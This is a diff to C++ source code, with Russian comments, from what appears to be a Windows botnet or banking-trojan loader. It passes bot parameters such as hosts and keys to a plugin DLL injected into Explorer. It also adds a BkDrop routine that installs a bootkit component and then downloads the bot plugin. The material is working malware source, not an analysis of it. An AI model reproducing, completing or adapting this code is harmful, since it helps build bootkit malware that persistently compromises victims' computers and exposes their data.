@@ -12,6 +12,8 @@
 #include "DbgRpt.h"
 #include "Utils.h"
 
+#include "BkInstall.h"
+
 
 
 
@@ -117,7 +119,7 @@ void DbgRptExplorerThread(void* Arguments)
 //----------------------------------------------------------------------------
 
 PWCHAR SVChostName = L"svchost.exe";
-char   BotPluginName[] =  "bktestmb.plug";
+char   BotPluginName[] = "bot.plug";
 
 namespace DLLLoader
 {
@@ -375,12 +377,15 @@ void ExplorerLoadDLL(PUSER_INIT_NOTIFY InitData, LPBYTE Buf, DWORD Size)
 
 	if (SetParamMethod != NULL)
 	{
+		SetBotParameter(BOT_PARAM_BOTPLUGNAME, BotPluginName);
+
 		// Устанавливаем параметры бота
 		LDRDBG("BRDS Explorer", "Устанавливаем параметры бота ");
 		SetParam(BOT_PARAM_PREFIX);
 		SetParam(BOT_PARAM_HOSTS);
 		SetParam(BOT_PARAM_KEY);
 		SetParam(BOT_PARAM_DELAY);
+		SetParam(BOT_PARAM_BOTPLUGNAME);
 	}
 
 	typedef void (WINAPI *TStart)(LPVOID, LPVOID, LPVOID);
@@ -411,6 +416,7 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 		DLLLoader::DLLLoadedInExplorer = false;
 
 
+	LDRDBG("BRDS Explorer", "DLLLoader::DLLLoadedInExplorer = %d", DLLLoader::DLLLoadedInExplorer);
 	if (DLLLoader::DLLLoadedInExplorer)
 		return true;
 
@@ -422,8 +428,7 @@ bool DoStartBotDll(PUSER_INIT_NOTIFY InitData, DWORD DelayBeforeStart)
 	if (Module != NULL)
 	{
 		// Расшифровываем содержимое
-		if (DelayBeforeStart != 0)
-		pSleep(DelayBeforeStart);
+		if (DelayBeforeStart != 0) pSleep(DelayBeforeStart);
 
 		LDRDBG("BRDS Explorer", "Длл прочитана и расшифрована ");
 		ExplorerLoadDLL(InitData, Module, Size);
@@ -673,7 +678,7 @@ void WaitForOldRing3BotSelfRemoved()
 // всё, что для этого.
 // Получилось значительно быстрее и изящнее.
 
-BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
+BOOL WINAPI LoadPlugToCache(BOOL WaitForBotRemove, DWORD /*ReservedTimeout*/)
 {
 	ResetBootkitLoaderFlag();
 
@@ -705,12 +710,27 @@ BOOL WINAPI LoadPlugToCache(DWORD /*ReservedTimeout*/)
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("317_ld"));
 		MemFree(Module);
 
-		WaitForOldRing3BotSelfRemoved();
+		if (WaitForBotRemove == TRUE) WaitForOldRing3BotSelfRemoved();
 
 		return TRUE;
 	}
 
 	return FALSE;
+}
+
+BOOL WINAPI BkDrop()
+{
+	ResetBootkitLoaderFlag();
+
+	// Устанавливаем буткит часть
+	// Если получается установить - скачиваем ботплаг.
+	bool InstallResult = DeployAndInstallBkDll();
+	LDRDBG("BkDrop", "DeployAndInstallBkDll return %d", InstallResult);
+
+	if (InstallResult == false) return FALSE;
+
+	// Закачиваем ботплаг и не ждем, потому что по идее бот сам нас ждет.
+	return LoadPlugToCache(FALSE, 0);
 }
 
 void WINAPI LoadAndStartPlugFromRawFile(const WCHAR* path)
